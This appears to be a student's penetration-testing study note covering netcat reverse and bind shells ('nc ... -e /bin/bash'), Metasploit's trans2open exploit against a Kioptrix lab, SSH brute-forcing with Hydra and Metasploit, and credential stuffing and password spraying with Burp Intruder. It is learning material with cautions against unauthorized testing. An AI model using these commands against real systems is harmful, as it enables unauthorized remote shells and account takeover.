---
Status: Done
---
# Shell basics

## What is a reverse shell

![[/image 53.png|image 53.png]]

1. A victim connects to us
2. The attacker opens a port
3. The victim will then connect to that open port and open some short of bash shell

## What is a bind shell

![[/image 1 6.png|image 1 6.png]]

1. The attacker connects to the victim
2. The victim will

## basic reverse shell setup with netcat

1. Open two terminals

- In terminal one, type:
    
    ```Bash
    nc -nvlp 4444
    ```
    
- This does the following
    1. -n = numeric only IP addresses
    2. -v = verbose
    3. -l = listen mode for inbound connections
    4. -p = specifies the port to listen on
- In terminal two, type:
    
    ```Bash
    nc ip_address_of_nc_server -e /bin/bash
    ```
    

  

## basic bind shell setup with netcat

1. Open two terminals

- In terminal one, type:
    
    ```Bash
    nc -nvlp 4444 -e /bin/bash
    ```
    
- This does the following
    1. -n = numeric only IP addresses
    2. -v = verbose
    3. -l = listen mode for inbound connections
    4. -p = specifies the port to listen on
- In terminal two, type:
    
    ```Bash
    nc ip_address_of_nc_server port_number
    ```
    

  

# Gaining root with Metasploit (Kioptrix SMB)

1. We identified samba 2.2 exploit with the use of searchsploit
    - trans2open
        
        ![[/image 2 7.png|image 2 7.png]]
        
2. Open Metasploit: msfconsole

- Search for trans2open
    
    ![[/image 3 5.png|image 3 5.png]]
    
- Select the module 
    
    ```Bash
    use 1
    OR
    use exploit/linux/samba/trans2open 
    ```
    
    ![[/image 4 5.png|image 4 5.png]]
    
- Set Options
    - set rhosts victim_ipAddress
- Run exploit
    
    ![[/image 5 5.png|image 5 5.png]]
    
- Other options
    - Set Payload
        
        ![[/image 6 5.png|image 6 5.png]]
        

# Bruteforce Attacks

## Hydra

Brute Forcing SSH with Hydra  
`Hydra` is a popular brute-forcing tool used to test SSH login credentials. Here’s the syntax and steps to execute it:  

- Basic Hydra Syntax
    
    ```JavaScript
    hydra -L <username> -P <password_list> ssh://<IP_address> -t <threads> -vV
    ```
    
    - `L`: Specifies the username (e.g., `root`).
    - `P`: Specifies the path to the password list (e.g., `/usr/share/wordlists/rockyou.txt`).
    - `ssh://<IP_address>`: Target SSH protocol and IP address.
    - `t`: Sets the number of threads (e.g., `4`).
    - `vV`: Enables verbosity to see attempts in real-time.
    
    1. **Example Command**:
        
        ```JavaScript
        hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.5.7 -t 4 -vv
        ```
        

## Metasploit SSH Login Bruteforce

### Brute Forcing SSH with Metasploit

Metasploit also offers SSH brute-forcing capabilities via auxiliary modules.

1. **Load the SSH Auxiliary Module**:
    
    ```Shell
    msfconsole
    search ssh_login
    use auxiliary/scanner/ssh/ssh_login
    ```
    
2. **Configure SSH Brute Force Options**:
    
    ```Shell
    set USERNAME root
    set PASS_FILE /usr/share/wordlists/rockyou.txt
    set RHOSTS 192.168.5.7
    set THREADS 10
    set VERBOSE true
    ```
    
3. **Run the Brute Force Attempt**:
    
    ```Shell
    run
    ```
    
4. **Notes**:
    - Adjust `THREADS` for speed but be cautious of network or detection systems.
    - **Verbose Mode**: Helps confirm each login attempt.

# Credential Stuffing and Password Spraying Techniques

- Overview of Credential Stuffing
    - **Definition**: Credential stuffing is the process of using breached usernames and passwords to gain unauthorized access to accounts on other sites.
    - **Method**: Attackers gather compromised credentials from breaches (e.g., LinkedIn, Equifax) and attempt to log into other sites with these credentials.
        - **Example**: The Tesla “breach pass” scenario, where repeated usernames and similar passwords are used to test credential stuffing.
    - **Process**:
        - Gather breached credentials.
        - Use tools to automate attempts to log in on target websites.
        - **Important**: Only a theoretical demonstration here; refrain from unauthorized testing on real websites.
- Setting Up Firefox for Credential Stuffing Practice
    - **FoxyProxy Installation**:
        - Search for and install FoxyProxy for Firefox.
        - Set up FoxyProxy to work with Burp Suite for intercepting and modifying requests.
    - **Configuration Steps**:
        - Configure FoxyProxy with Burp Suite’s local address (`127.0.0.1`) and port (`8080`).
        - Enable the proxy to toggle easily between on/off for testing.
- ==Credential Stuffing with Burp Suite’s Intruder==
    - **Steps in Burp Suite**:
        1. **Intercept a Login Request**: Turn on intercept, enter fake credentials (e.g., `test@test.com` and `password`), and capture the request.
            
            ![[/image 7 5.png|image 7 5.png]]
            
        2. **Send to Intruder**: Right-click and send the captured request to the Intruder tool.
            
            ![[/image 8 5.png|image 8 5.png]]
            
        3. **Click on the Intruder Tab**
        4. **Set Parameters**:
            - Clear auto-selected positions, then manually select email and password fields.
                
                ![[/image 9 5.png|image 9 5.png]]
                
        5. **Attack Types**:
            - Use the **Pitchfork** attack type to try pairs of usernames and passwords in parallel.
                
                ![[/image 10 5.png|image 10 5.png]]
                
        6. **Payloads**:
            - Load lists of usernames and passwords for simultaneous testing.
                
                ![[/image 11 5.png|image 11 5.png]]
                
                ![[/image 12 5.png|image 12 5.png]]
                
        7. **Run and Monitor**:
            - Execute the attack, then monitor responses for changes in status codes (e.g., `200` to `301`) or length, which could indicate a successful login.
                
                ![[/image 13 5.png|image 13 5.png]]
                
- Detecting Successful Login Indicators
    - **Common Indicators**:
        - Status code change (e.g., `200` OK vs. `301` Redirect).
        - Significant change in response length.
    - **Response Analysis**:
        - Use Burp Suite’s **Grep** feature to detect specific error messages (e.g., "We could not sign you in").
- ==Password Spraying==
    - **Definition**: Password spraying uses common or predictable passwords across a broad list of usernames, minimizing lockout risks.
    - **Process**:
        - Collect usernames/emails from public sources ([Hunter.io](http://hunter.io/), LinkedIn) or breached lists.
        - When selecting the parameters, select only the username field
        - And Change the password to the password that you want to spray
            
            ![[/image 14 5.png|image 14 5.png]]
            
        - Use common passwords (e.g., `Fall2021!`, `Tesla123`, `Password123!`).
    - **Important**: When testing Active Directory, clarify lockout policies with clients to prevent accidental user lockouts (e.g., setting a low number of attempts and allowing time between tries).

  

---